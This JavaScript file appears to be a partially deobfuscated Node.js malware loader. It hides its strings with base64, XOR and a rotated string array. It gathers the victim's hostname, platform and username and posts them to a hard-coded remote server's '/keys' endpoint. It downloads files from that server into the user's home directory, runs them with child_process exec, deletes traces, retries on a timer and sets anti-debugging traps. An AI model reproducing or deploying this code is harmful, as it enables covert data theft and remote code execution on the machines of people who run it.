const getStringFromArray = F;

(function (stringArray, targetValue) {
  const getString = F;
  const array = stringArray();

  while (true) {
    try {
      const sum =
        parseInt(getString(0xd0)) / 0x1 +
        -parseInt(getString(0xd2)) / 0x2 +
        (parseInt(getString(0xcb)) / 0x3) * (parseInt(getString(0xbb)) / 0x4) +
        (parseInt(getString(0xc4)) / 0x5) * (-parseInt(getString(0xd9)) / 0x6) +
        -parseInt(getString(0xce)) / 0x7 +
        (-parseInt(getString(0xb5)) / 0x8) * (parseInt(getString(0xcf)) / 0x9) +
        (-parseInt(getString(0xbe)) / 0xa) * (-parseInt(getString(0xb2)) / 0xb);

      if (sum === targetValue) break;
      else array['push'](array['shift']());
    } catch (error) {
      array['push'](array['shift']());
    }
  }
})(D, 0xac73e);

const ENCODING = 'base64';
const CHARSET = getStringFromArray(0xdf);
const fs = require('fs');
const os = require('os');

const decodeBase64 = (str) => {
  const s1 = str[getStringFromArray(0xb3)](0x1);
  return Buffer['from'](s1, ENCODING)[getStringFromArray(0xd5)](CHARSET);
};

const request = require(decodeBase64(getStringFromArray(0xbf) + 'A'));
const path = require(decodeBase64('zcGF0aA'));
const exec = require(decodeBase64(getStringFromArray(0xc0) + 'HJvY2Vzcw'))[
  decodeBase64('cZXhlYw')
];
const process = require(decodeBase64('Zbm9kZTpwc' + getStringFromArray(0xdb)));
const homeDir = os[decodeBase64('ZaG9tZWRpc' + 'g')]();
const hostname = os[decodeBase64(getStringFromArray(0xd3) + 'WU')]();
const platform = os[decodeBase64(getStringFromArray(0xb8) + 'm0')]();
const username = os[decodeBase64(getStringFromArray(0xb9) + 'm8')]();

let timestamp;

const baseUrl = getStringFromArray(0xc2) + getStringFromArray(0xc5);
const port = ':124';

const decode = (str) =>
  Buffer['from'](str, ENCODING)[getStringFromArray(0xd5)](CHARSET);

let serverUrl = '';
let type = '';

const xorKey = [0x24, 0xc0, 0x29, 0x8];

const xorString = (input) => {
  const getString = getStringFromArray;
  let output = '';
  let result;

  for (let i = 0; i < input['length']; i++) {
    result = 0xff & (input[i] ^ xorKey[0x3 & i]);
    output += String[getString(0xc3) + 'de'](result);
  }
  return output;
};

const getPath = getStringFromArray(0xca);
const writePath = getStringFromArray(0xd1) + getStringFromArray(0xde);
const fileExists = decode(getStringFromArray(0xda) + getStringFromArray(0xc7));

function F(index, unused) {
  const stringArray = D();
  return (
    (F = function (rawIndex, notUsed) {
      rawIndex = rawIndex - 0xb2;
      let resultString = stringArray[rawIndex];
      return resultString;
    }),
    F(index, unused)
  );
}

function checkFileExists(path) {
  return fs[fileExists](path);
}

const makeDir = decode('bWtkaXJTeW' + '5j');
const dirKey = [0xa, 0xb6, 0x5a, 0x6b, 0x4b, 0xa4, 0x4c];
const fileKey = [0xb, 0xaa, 0x6];

const createDirectory = () => {
  const getString = getStringFromArray;
  const getRequest = decode(getPath);
  const writeFile = decode(writePath);
  const dirPath = xorString(dirKey);
  let targetDir = path[getString(0xc9)](homeDir, dirPath);
  let dir;

  try {
    dir = targetDir;
    fs[makeDir](dir, { recursive: true });
  } catch (error) {
    targetDir = homeDir;
  }

  const url = '' + serverUrl + xorString(fileKey) + type;
  const filePath = path[getString(0xc9)](targetDir, xorString(fileKey2));

  try {
    (function (path) {
      const getString = getStringFromArray;
      const remove = decode(getString(0xdc));
      fs[remove](path);
    })(filePath);
  } catch (error) {}

  request[getRequest](url, (error, response, body) => {
    if (!error) {
      try {
        fs[writeFile](filePath, body);
      } catch (error) {}
      processDirectory(targetDir);
    }
  });
};

const fileKey2 = [0x50, 0xa5, 0x5a, 0x7c, 0xa, 0xaa, 0x5a];
const fileKey3 = [0xb, 0xb0];
const fileKey4 = [
  0x54, 0xa1, 0x4a, 0x63, 0x45, 0xa7, 0x4c, 0x26, 0x4e, 0xb3, 0x46, 0x66,
];

const processDirectory = (dir) => {
  const getRequest = decode(getPath);
  const writeFile = decode(writePath);
  const url = '' + serverUrl + xorString(fileKey3);
  const filePath = path['join'](dir, xorString(fileKey4));

  if (checkFileExists(filePath)) {
    executeCommand(dir);
  } else {
    request[getRequest](url, (error, response, body) => {
      if (!error) {
        try {
          fs[writeFile](filePath, body);
        } catch (error) {}
        executeCommand(dir);
      }
    });
  }
};

const cmdKey = [0x47, 0xa4];
const cmdArgs = [
  0x2, 0xe6, 0x9, 0x66, 0x54, 0xad, 0x9, 0x61, 0x4, 0xed, 0x4, 0x7b, 0x4d, 0xac,
  0x4c, 0x66, 0x50,
];
const cmdPath = [
  0x4a, 0xaf, 0x4d, 0x6d, 0x7b, 0xad, 0x46, 0x6c, 0x51, 0xac, 0x4c, 0x7b,
];

const executeCommand = (dir) => {
  const getString = getStringFromArray;
  const cmd =
    xorString(cmdKey) + '\x20\x22' + dir + '\x22\x20' + xorString(cmdArgs);
  const filePath = path[getString(0xc9)](dir, xorString(cmdPath));

  try {
    if (checkFileExists(filePath)) {
      cleanupFiles(dir);
    } else {
      exec(cmd, (error, stdout, stderr) => {
        executeNextCommand(dir);
      });
    }
  } catch (error) {}
};

const cmdKey2 = [0x4a, 0xaf, 0x4d, 0x6d];
const cmdArgs2 = [
  0x4a, 0xb0, 0x44, 0x28, 0x9, 0xed, 0x59, 0x7a, 0x41, 0xa6, 0x40, 0x70,
];
const cmdPath2 = [0x4d, 0xae, 0x5a, 0x7c, 0x45, 0xac, 0x45];

const executeNextCommand = (dir) => {
  const getString = getStringFromArray;
  const cmd =
    xorString(cmdArgs2) + '\x20\x22' + dir + '\x22\x20' + xorString(cmdPath2);
  const filePath = path[getString(0xc9)](dir, xorString(cmdPath));

  try {
    if (checkFileExists(filePath)) {
      cleanupFiles(dir);
    } else {
      exec(cmd, (error, stdout, stderr) => {
        cleanupFiles(dir);
      });
    }
  } catch (error) {}
};

const cleanupFiles = (dir) => {
  const getString = getStringFromArray;
  const filePath = path[getString(0xc9)](dir, xorString(fileKey2));
  const cmd = xorString(cmdKey2) + '\x20' + filePath;

  try {
    exec(cmd, (error, stdout, stderr) => {});
  } catch (error) {}
};

const formData = decodeBase64(getStringFromArray(0xcd) + 'GE');
const url = decodeBase64(getStringFromArray(0xdd));
const post = decode(getStringFromArray(0xc6));
let host = getStringFromArray(0xba);

function D() {
  const stringArray = [
    '1100916ynYuqS',
    'ZXhpc3RzU3',
    'm9jZXNz',
    'cm1TeW5j',
    'adXJs',
    'xlU3luYw',
    'utf8',
    '12771rfZOPH',
    'slice',
    '3E1',
    '1080NqQcog',
    '6df937fe9011',
    'split',
    'YcGxhdGZvc',
    'AdXNlckluZ',
    'cmp',
    '12oUfARq',
    'ZT3',
    '/s/',
    '10990NuLusk',
    'YcmVxdWVzd',
    'aY2hpbGRfc',
    'oqr',
    'aaHR0cDovL',
    'fromCharCo',
    '35onXXhB',
    'w==',
    'cG9zdA',
    'luYw',
    'LjEzNS4xOT',
    'join',
    'Z2V0',
    '170718pyusLc',
    'length',
    'cZm9ybURhd',
    '2001279anzPgZ',
    '23409VesLJH',
    '1212302AGrpWU',
    'd3JpdGVGaW',
    '62318pTCWcq',
    'caG9zdG5hb',
    'E2LjE3MjAw',
    'toString',
    'dXNlcm5hbW',
    'My4xMTUuMj',
    'substring',
  ];
  D = function () {
    return stringArray;
  };
  return D();
}

const makeRequest = async (attempt) => {
  const getString = getStringFromArray;
  const serverUrl = ((attempt) => {
    const getString = F;
    let encoded =
      0 == attempt
        ? getString(0xd7) + getString(0xd4)
        : getString(0xc8) + 'UuMTc5MzM=';
    let part1 = '';
    let part2 = '';
    let part3 = '';

    for (let i = 0; i < 0x4; i++) {
      part1 += encoded[0x2 * i] + encoded[0x2 * i + 0x1];
      part2 += encoded[0x8 + 0x2 * i] + encoded[0x9 + 0x2 * i];
      part3 += encoded[0x10 + i];
    }

    return (
      decode(baseUrl[getString(0xd8)](0x1)) +
      decode(part2 + part1 + part3) +
      port +
      '4'
    );
  })(attempt);

  const getRequest = decode(getPath);
  let requestUrl = serverUrl + getString(0xbd);
  requestUrl += getString(0xb6);

  request[getRequest](requestUrl, (error, response, body) => {
    if (error) {
      if (attempt < 0x1) makeRequest(0x1);
    } else {
      const result = ((response) => {
        const getString = F;
        if (0 == response['search'](getString(0xbc))) {
          let data = '';
          try {
            for (let i = 0x3; i < response[getString(0xcc)]; i++) {
              data += response[i];
            }
            let arr = decode(data);
            arr = arr[getString(0xb7)](',');
            serverUrl =
              decode(baseUrl[getString(0xd8)](0x1)) + arr[0] + port + '4';
            type = arr[0x1];
          } catch (error) {
            return 0;
          }
          return 0x1;
        }
        return 0;
      })(body);

      if (result > 0) {
        sendData();
        startProcess();
      }
    }
  });
};

const sendData = async () => {
  const getString = getStringFromArray;
  host = hostname;

  if ('d' == platform[0]) {
    host = host + '+' + username[decode(getString(0xd6) + 'U')];
  }

  let args = getString(0xb4);
  try {
    args += process[decode('YXJndg')][0x1];
  } catch (error) {}

  sendRequest(getString(0xc1), args);
};

const sendRequest = async (type, data) => {
  const payload = {
    ts: timestamp,
    type: type,
    hid: host,
    ss: type,
    cc: data,
  };

  const options = {
    [url]: '' + serverUrl + decode('L2tleXM'),
    [formData]: payload,
  };

  try {
    request[post](options, (error, response, body) => {});
  } catch (error) {}
};

const startProcess = async () =>
  await new Promise((resolve, reject) => {
    createDirectory();
  });

let attempts = 0;

const init = async () => {
  const getString = getStringFromArray;
  try {
    timestamp = Date['now']()[getString(0xd5)]();
    await makeRequest(0);
  } catch (error) {}
};

init();

let interval = setInterval(() => {
  attempts += 0x1;
  if (attempts < 0x3) {
    init();
  } else {
    clearInterval(interval);
  }
}, 0x927c0);

function obfuscate(input) {
  function inner(value) {
    const getString = a5;
    if (typeof value === 'string') {
      return function (unused) {}
        [getString(0xe4)]('while (true) {}')
        [getString(0x102)](getString(0xc6));
    } else {
      if (
        ('' + value / value)[getString(0xff)] !== 0x1 ||
        value % 0x14 === 0x0
      ) {
        return function () {
          return !![];
        }
          [getString(0xe4)](getString(0xad) + getString(0xcf))
          [getString(0xeb)]('action');
      } else {
        return function () {
          return ![];
        }
          [getString(0xe4)]('debu' + getString(0xcf))
          [getString(0x102)]('stateObject');
      }
    }
    inner(++value);
  }

  try {
    if (input) return inner;
    else inner(0x0);
  } catch (error) {}
}
